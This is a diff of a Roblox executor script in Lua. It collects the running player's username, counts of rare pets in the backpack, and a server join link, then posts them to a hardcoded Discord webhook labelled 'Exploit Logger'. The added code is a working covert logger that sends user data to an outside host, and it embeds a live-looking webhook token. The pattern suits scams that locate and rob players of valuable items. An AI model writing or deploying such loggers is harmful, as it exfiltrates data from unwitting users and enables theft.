@@ -1,41 +1,55 @@
--- Your Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local backpack = LocalPlayer.Backpack
 
--- Get the local player
-local player = game:GetService("Players").LocalPlayer
+local webhookUrl = "https://discord.com/api/webhooks/1374728692663849100/y25fQk-wOS3fkR4r4fL5XjFA-C-YMDrvGeqC-dPKwWhc6RnKYbB57VnrR294YcNnbBvA"
 
--- Webhook data
+local counts = {Dragonfly = 0, Raccoon = 0, ["Red Fox"] = 0}
+
+for _, item in ipairs(backpack:GetChildren()) do
+    if item:IsA("Tool") and item.Name then
+        local name = string.lower(item.Name)
+        if string.find(name, "dragonfly") then
+            counts.Dragonfly = counts.Dragonfly + 1
+        elseif string.find(name, "raccoon") then
+            counts.Raccoon = counts.Raccoon + 1
+        elseif string.find(name, "red fox") then
+            counts["Red Fox"] = counts["Red Fox"] + 1
+        end
+    end
+end
+
+local placeId = tostring(game.PlaceId)
+local jobId = tostring(game.JobId)
+local joinLink = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId
+local generatedAt = os.date("%Y-%m-%d %H:%M:%S")
+
 local data = {
-    content = "**Username:** " .. player.Name, -- Shows username in plain text
-    username = "Exploit Logger"
+    username = "Exploit Logger",
+    embeds = {{
+        title = "Exploit Script Executed",
+        color = 3447003,
+        fields = {
+            {name = "Username", value = LocalPlayer.Name, inline = true},
+            {name = "Dragonfly Count", value = tostring(counts.Dragonfly), inline = true},
+            {name = "Raccoon Count", value = tostring(counts.Raccoon), inline = true},
+            {name = "Red Fox Count", value = tostring(counts["Red Fox"]), inline = true},
+            {name = "Place ID", value = placeId, inline = true},
+            {name = "Job ID", value = jobId, inline = false},
+            {name = "Join Server", value = "[Click to Join Game Instance]("..joinLink..")", inline = false},
+            {name = "Generated at", value = generatedAt, inline = false},
+        }
+    }}
 }
 
--- Encode data as JSON
-local HttpService = game:GetService("HttpService")
 local body = HttpService:JSONEncode(data)
 
--- Get universal HTTP request function
-local function getRequestFunction()
-    return (syn and syn.request) or 
-           (http and http.request) or 
-           request or 
-           http_request or 
-           (fluxus and fluxus.request)
-end
+local requestFunc = (syn and syn.request) or (http and http.request) or request or http_request or (fluxus and fluxus.request)
+if not requestFunc then return end
 
-local requestFunc = getRequestFunction()
-
-if not requestFunc then
-    warn("No supported HTTP request function found.")
-    return
-end
-
--- Send the webhook
 requestFunc({
     Url = webhookUrl,
     Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
+    Headers = {["Content-Type"] = "application/json"},
     Body = body
 })
